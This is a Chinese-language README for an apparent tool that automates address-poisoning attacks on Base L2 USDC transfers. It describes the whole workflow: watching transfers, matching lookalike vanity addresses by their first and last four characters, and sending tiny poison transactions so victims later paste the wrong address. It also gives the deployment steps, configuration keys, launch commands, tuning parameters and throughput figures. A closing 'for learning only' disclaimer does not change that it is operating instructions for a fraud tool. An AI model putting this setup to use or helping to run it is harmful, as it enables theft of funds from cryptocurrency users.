# Base L2  USDC 地址投毒工具

[English](./README_EN.md)

Base L2  USDC 地址投毒工具

## 咋回事

有人转 USDC → 我们找个长得像的地址 → 给他发一笔小的 → 他下次可能复制错

具体流程：
1. WebSocket 订阅 Transfer 事件
2. 拿 from 地址的前4后4去内存里找匹配的
3. 找到就用那个地址发 0.0001 USDC 过去
4. 完事

## 模块

```
generator/   Rust 跑地址，一小时二十万个
core/        Go 监控+匹配，内存里放了150亿地址
executor/    攒一批一起发，省 gas
base.sol     合约，批量打钱用的
```

## 跑起来

先装 Docker，内存至少 64G

```bash
git clone https://github.com/yourname/base-poison.git
cd base-poison
cp .env.example .env
vim .env  # 改配置
```

`.env` 要填的：

```bash
POSTGRES_PASSWORD=xxx
GENERATOR_MASTER_KEY=xxx  # openssl rand -hex 32

RPC_URLS=https://mainnet.base.org
WS_URLS=wss://base.publicnode.com

POISONER_CONTRACT=0x...   # 你部署的合约
OWNER_PRIVATE_KEY=0x...

WEB_SECRET_PATH=xxx
WEB_PASSWORD=xxx
```

部署合约：先改 `base.sol` 里的 OWNER，部署后充 ETH 和 USDC

启动：

```bash
docker compose -f docker-compose.prod.yml up -d
docker logs -f poison_core

# 跑地址生成（要跑很久）
docker compose -f docker-compose.prod.yml run generator
```

控制台：`http://ip:8083/你的路径`

## 参数

| 参数 | 干嘛的 | 默认 |
|-----|-------|-----|
| `BATCH_SIZE_MIN/MAX` | 攒多少个一起发 | 100-300 |
| `USDC_AMOUNT` | 发多少 USDC | 0.0001 |
| `ETH_AMOUNT` | 每个地址充多少 gas | 0.0000005 |
| `MIN_TRANSFER_AMOUNT_USD` | 多少刀以上才投 | 30 |
| `USE_MEMORY_INDEX` | 地址放内存里 | true |

## 跑分

80 核 128G 机器：
- 生成：20w/h
- 匹配：<100μs
- 内存：150 亿地址吃 80G
- 延迟：发现到投毒 2 秒内

## 注意

- 私钥 AES-256-GCM 加密存的
- 生产环境套 nginx + https
- pg 别开公网

学习用，出事别找我



MIT

